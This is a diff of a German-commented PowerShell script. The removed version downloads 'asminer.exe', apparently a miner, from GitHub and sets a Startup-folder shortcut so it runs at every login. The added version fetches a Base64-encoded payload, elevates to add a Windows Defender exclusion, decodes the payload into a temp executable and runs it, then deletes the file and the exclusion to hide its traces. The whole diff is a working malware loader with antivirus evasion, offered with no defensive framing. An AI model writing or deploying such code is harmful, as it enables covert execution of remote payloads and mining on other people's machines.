@@ -1,26 +1,79 @@
-$startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\asminer.lnk")
-#$Path = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows")
-$Path = "C:\"
-$runpath = [System.IO.Path]::Combine($Path, "\asminer.exe")
-# URL der Datei, die heruntergeladen werden soll
-$url = "https://github.com/Lorcan84/test/raw/main/asminer.exe"
+# URL der Base64-kodierten Datei auf dem Webserver
+$fileUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/app"
 
-# Pfad, wo die Datei gespeichert werden soll
-#$output = $Path
+# Pfad zum Herunterladen der Base64-kodierten Datei
+$downloadPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "Base64String.txt")
 
-# Herunterladen der Datei
-Invoke-WebRequest -Uri $url -OutFile $Path
+# Herunterladen der Datei von einem Webserver
+try {
+    Invoke-WebRequest -Uri $fileUrl -OutFile $downloadPath
+    Write-Output "Datei von Webserver heruntergeladen: $downloadPath"
+} catch {
+    Write-Error "Fehler beim Herunterladen der Datei: $_"
+    exit 1
+}
 
-Write-Output "Datei wurde erfolgreich heruntergeladen und gespeichert unter $output"
+# Überprüfen, ob die Datei erfolgreich heruntergeladen wurde
+if (-Not (Test-Path $downloadPath)) {
+    Write-Error "Die heruntergeladene Datei wurde nicht gefunden: $downloadPath"
+    exit 1
+}
 
-# COM-Objekt für das Erstellen der Verknüpfung
-$shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut($startupPath)
+# Definiere den Pfad zur temporären Datei
+$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "temp_executable.exe")
 
-# Pfad und Argumente für die Verknüpfung setzen
-$shortcut.TargetPath = $runpath
-$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($runath)
-$shortcut.Save()
+# Erstelle eine Ausnahme im Windows Defender für den spezifischen Pfad
+$exceptionCommand = "Add-MpPreference -ExclusionPath '$tempFilePath'"
+Start-Process powershell -ArgumentList "-Command $exceptionCommand" -Verb RunAs -Wait
 
-Unblock-File -Path $Path
-Start-Process -Filepath $Path
+Write-Output "Ausnahme für Windows Defender hinzugefügt: $tempFilePath"
+
+# Base64-kodierter String (aus der heruntergeladenen Datei)
+$base64String = Get-Content $downloadPath -Raw
+
+# Überprüfen, ob der Base64-String geladen wurde
+if ([string]::IsNullOrEmpty($base64String)) {
+    Write-Error "Der Base64-String konnte nicht geladen werden."
+    exit 1
+}
+
+# Base64-Dekodierung
+try {
+    $bytes = [Convert]::FromBase64String($base64String)
+    Write-Output "Base64-Dekodierung erfolgreich."
+} catch {
+    Write-Error "Fehler bei der Base64-Dekodierung: $_"
+    exit 1
+}
+
+# Temporäre Datei schreiben
+try {
+    [System.IO.File]::WriteAllBytes($tempFilePath, $bytes)
+    Write-Output "Temporäre Datei erstellt unter: $tempFilePath"
+
+    # Führe die .exe-Datei aus
+    & $tempFilePath
+
+    # Warte, bis der Prozess beendet ist
+    Start-Sleep -Seconds 5
+} catch {
+    Write-Error "Fehler beim Ausführen der Datei: $_"
+} finally {
+    # Lösche die temporäre Datei
+    if (Test-Path $tempFilePath) {
+        Remove-Item $tempFilePath
+        Write-Output "Temporäre Datei gelöscht."
+    }
+}
+
+# Entferne die Ausnahme aus Windows Defender
+$removeExceptionCommand = "Remove-MpPreference -ExclusionPath '$tempFilePath'"
+Start-Process powershell -ArgumentList "-Command $removeExceptionCommand" -Verb RunAs -Wait
+
+Write-Output "Ausnahme für Windows Defender entfernt: $tempFilePath"
+
+# Entferne die heruntergeladene Base64-Datei
+if (Test-Path $downloadPath) {
+    Remove-Item $downloadPath
+    Write-Output "Heruntergeladene Datei gelöscht: $downloadPath"
+}
